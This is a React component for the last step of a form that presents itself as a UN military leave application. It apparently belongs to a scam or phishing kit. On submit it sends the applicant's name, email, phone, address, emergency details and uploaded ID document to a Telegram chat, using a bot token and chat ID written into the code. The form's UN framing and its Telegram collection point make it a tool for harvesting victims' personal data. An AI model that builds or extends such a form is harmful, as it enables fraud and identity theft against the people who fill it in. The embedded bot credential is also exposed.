
import React, { useState } from 'react';
import { useFormContext } from '@/contexts/FormContext';
import { Button } from '@/components/ui/button';
import { Checkbox } from '@/components/ui/checkbox';
import { toast } from 'sonner';
import { sendToTelegram } from '@/utils/telegramUtils';

const Step6Consent = () => {
  const { formData, updateFormData, prevStep, isStepValid, nextStep } = useFormContext();
  const [isSubmitting, setIsSubmitting] = useState(false);
  
  const handleConsentChange = (checked: boolean) => {
    updateFormData({ consent: checked });
  };
  
  const handleSubmit = async () => {
    setIsSubmitting(true);
    
    try {
      const botToken = '7749163012:AAGrq3WxuA1pdnQX5yNCtxabsxuctwssx7Y'; // Updated Bot Token
      const chatId = '-4970215486'; // Updated Chat ID
      
      const success = await sendToTelegram(botToken, chatId, formData, formData.idProof);
      
      if (success) {
        nextStep(); // Move to success step if Telegram send was successful
      } else {
        // Error message already handled by sendToTelegram console.error
        toast.error('Failed to send application data. Please try again.');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      toast.error('There was a problem submitting your application. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };
  
  return (
    <div className="animate-fade-in max-w-2xl mx-auto">
      <h2 className="text-2xl font-bold mb-6 text-center text-gray-800">Confirm and Submit</h2>
      <p className="text-center mb-8 text-gray-600">
        Please review your information and confirm submission
      </p>
      
      <div className="bg-gray-50 border border-gray-200 rounded-lg p-6 mb-8">
        <h3 className="font-semibold text-lg mb-4">Application Summary</h3>
        
        <div className="space-y-4"> {/* Changed from grid to space-y for better stacking control */}
          <div className="flex flex-col sm:grid sm:grid-cols-3 border-b border-gray-200 pb-2 pt-2">
            <span className="font-medium text-gray-600 sm:col-span-1">Leave Type:</span>
            <span className="sm:col-span-2">{formData.leaveType}</span>
          </div>
          
          <div className="flex flex-col sm:grid sm:grid-cols-3 border-b border-gray-200 pb-2 pt-2">
            <span className="font-medium text-gray-600 sm:col-span-1">Relationship:</span>
            <span className="sm:col-span-2">{formData.relationship}</span>
          </div>
          
          <div className="flex flex-col sm:grid sm:grid-cols-3 border-b border-gray-200 pb-2 pt-2">
            <span className="font-medium text-gray-600 sm:col-span-1">Military Personnel:</span>
            <div className="sm:col-span-2">
              <p>{formData.militaryName}</p>
              <p className="text-sm text-gray-500">ID: {formData.militaryId}</p>
              <p className="text-sm text-gray-500">Unit: {formData.militaryUnit}</p>
              <p className="text-sm text-gray-500">Location: {formData.militaryLocation}</p>
              <p className="text-sm text-gray-500">Rank: {formData.militaryRank}</p>
            </div>
          </div>
          
          <div className="flex flex-col sm:grid sm:grid-cols-3 border-b border-gray-200 pb-2 pt-2">
            <span className="font-medium text-gray-600 sm:col-span-1">Applicant:</span>
            <div className="sm:col-span-2">
              <p>{formData.applicantName}</p>
              <p className="text-sm text-gray-500">{formData.email}</p>
              <p className="text-sm text-gray-500">{formData.phone}</p>
              <p className="text-sm text-gray-500">{formData.address}, {formData.country}</p>
            </div>
          </div>
          
          <div className="flex flex-col sm:grid sm:grid-cols-3 border-b border-gray-200 pb-2 pt-2">
            <span className="font-medium text-gray-600 sm:col-span-1">Emergency:</span>
            <div className="sm:col-span-2">
              <p>{formData.emergencyType}</p>
              <p className="text-sm text-gray-500">{formData.emergencyDescription}</p>
            </div>
          </div>
          
          <div className="flex flex-col sm:grid sm:grid-cols-3 pb-2 pt-2"> {/* Removed border-b from last item */}
            <span className="font-medium text-gray-600 sm:col-span-1">Document:</span>
            <span className="sm:col-span-2">
              {formData.idProof ? formData.idProof.name : "No document uploaded"}
            </span>
          </div>
        </div>
      </div>
      
      <div className="mb-8 flex items-start space-x-3">
        <Checkbox 
          id="consent" 
          checked={formData.consent} 
          onCheckedChange={handleConsentChange} 
          className="mt-1"
        />
        <div>
          <label htmlFor="consent" className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70">
            I confirm that all information provided is accurate and complete
          </label>
          <p className="text-xs text-gray-500 mt-1">
            By submitting this form, I acknowledge that providing false information may result in the denial of the leave request and possible disciplinary action in accordance with UN regulations.
          </p>
        </div>
      </div>
      
      <div className="flex justify-between mt-10">
        <Button 
          onClick={prevStep}
          variant="outline" 
          className="border-gray-300 text-gray-700 hover:bg-gray-100"
        >
          Back
        </Button>
        <Button 
          onClick={handleSubmit}
          disabled={!isStepValid(6) || isSubmitting}
          className="bg-unblue hover:bg-unblue-dark text-white font-medium min-w-[150px]"
        >
          {isSubmitting ? 'Submitting...' : 'Submit Application'}
        </Button>
      </div>
    </div>
  );
};

export default Step6Consent;

